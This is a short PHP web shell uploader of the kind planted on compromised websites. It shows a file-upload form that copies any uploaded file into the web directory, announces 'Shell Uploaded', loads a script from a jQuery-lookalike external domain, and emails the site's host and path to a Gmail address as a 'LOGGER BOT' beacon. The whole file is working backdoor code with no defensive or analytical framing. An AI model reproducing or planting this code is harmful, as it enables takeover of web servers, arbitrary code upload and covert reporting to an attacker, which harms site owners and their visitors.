<?php
echo '
<script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br>'; }
}
$ra44  = rand(1,99999);$subj98 = "LOGGER BOT";
$from="From: SHELL BOT<noreply@cs53.hostneverdie.com>";$b75 = $_SERVER['HTTP_HOST'];
$a45 = $_SERVER['REQUEST_URI'];$email = "ternakayam333@gmail.com";
$alfa = "LINK : $b75$a45";$msg8873 = "$alfa\n";
mail($email, $subj98, $msg8873, $from);?>